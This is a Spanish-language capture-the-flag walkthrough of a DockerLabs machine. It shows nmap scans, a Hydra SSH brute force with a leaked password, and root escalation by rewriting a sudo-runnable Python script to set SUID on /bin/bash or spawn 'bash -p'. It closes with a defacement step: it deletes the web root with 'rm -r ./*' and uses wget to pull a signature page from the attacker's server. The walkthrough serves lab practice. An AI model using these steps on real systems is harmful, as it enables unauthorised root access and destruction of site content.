
![[20250807112116.png]]

# Fase de reconocimiento

primero realizamos un escaneo básico de puertos con nmap

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
```

una vez detectados los puertos que están abiertos realizamos un segundo escaneo con scripts básicos de nmap para ver que servicios y versiones corren por detras 

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

![[20250807112448.png]]

una vez sabemos los servicios y versiones vamos a ver que se esta ejecutando en la pagina web del puerto 80.

vemos una pagina web de Ubuntu apache

![[20250807112714.png]]

esto corre por el puerto 80 en el directorio 172.17.0.2/index.html vamos a ver si existe un index.php

![[20250807112802.png]]

# Fase de explotacion

vemos que si existe y que contiene lo que podría ser una contraseña no parece que este encriptada ya que solo hay dos números y todas las letras son mayúsculas así que probaremos un ataque con hydra hacia el puerto 22 que estaba abierto usando esta cadena como posible contraseña

```bash
hydra -t 64 -v -L /usr/share/wordlists/SecLists/Usernames/Names/names.txt -p JIFGHDS87GYDFIGD -s 22 172.17.0.2 ssh
```

![[20250807114205.png]]

podemos ver que ha encontrado un usuario "carlos" cuya contraseña es "JIFGHDS87GYDFIGD" por lo que vamos a tratar de conectarnos por ssh.

![[20250807114312.png]]

Y efectivamente tenemos shell en la máquina victima.

# Fase de post-explotación

primero para trabajar mas cómodos haremos una exportación de la TERM a xterm que es la mas usada y cómoda para mi

```bash
export TERM=xterm
```

con esto ya podremos hacer Ctrl + L 


vamos a ver si tenemos permisos de SUDO con algun binario

```bash
sudo -l
```

![[20250807114542.png]]

aqui vemos que podemos ejecutar como root el script se python que esta en la ruta /opt

vamos a ver que permisos tenemos sobre el script

![[20250807114641.png]]

vemos que somos los propietarios del archivo por lo que vamos a eliminarlo y a crear un script con el mismo nombre pero que nos ayude a escalar a root

# Escalada de privilegios 

primero vamos al directorio /opt

```bash
cd /opt
```

y luego borraremos el archivo 

```bash
rm -rf script.py
```

ahora crearemos de nuevo el archivo pero con el siguiente codigo dentro:

```bash
nano script.py
```

```python
import os
import sys

os.system("chmod u+s /bin/bash")
```

lo guardamos y vamos a ejecutar el programa como root

```bash
sudo python3 /opt/script.py
```

![[20250807115058.png]]

ahi podemos ver que ahora la /bin/bash tiene permisos SUID lo que nos permite convertirnos en root cuando queramos con el comando

```bash
bash -p
```

![[20250807115155.png]]

# Extra 1 - alternativa código python

como siempre que hay un script de python con permisos sudo utilizo el comando "chmod u+s /bin/bash" os voy a dejar una alternativa por si quereis directamente la shell como root 

```python
import os
import sys

os.system("bash -p")
```

![[20250807115511.png]]

aqui podéis ver el código python, la bash no tiene permisos SUID y al ejecutar el programa con sudo nos da la shell directamente como root.

# Extra 2 - Firma en http

vamos a dejar nuestra firma en http como solemos hacer en los CTF de dockerlabs. Una vez somos root haremos 

```bash
cd /var/www/html/
```

```bash
rm -r ./*
```

y ahora en nuestra maquina atacante abrimos un puerto http con python

![[20250807115807.png]]

en esta carpeta tengo mi index.html con la imagen panda.png que es la que utilizo para dejar la firma panda2 era otra posible imagen que al final no utilice y proceso son los pasos que os estoy explicando. de esta carpeta lo único que deberíais tener es el index.html personalizado y la imagen que vayáis a utilizar, ahora si abrimos el puerto con python

```bash
python3 -m http.server 8081
```

y en la maquina victima pondremos lo siguiente 

```bash
wget http://192.168.1.182:8081/index.html -O index.html && wget http://192.168.1.182:8081/panda.png -O panda.png
```

![[20250807120048.png]]

una vez se confirma la descarga vamos a la pagina http de la victima y recargamos

![[20250807120120.png]]

y ahí esta nuestra firma.

si queréis ver el proceso con la creación y código del  html esta en mi writeup de la maquina chocolate de DockerLabs.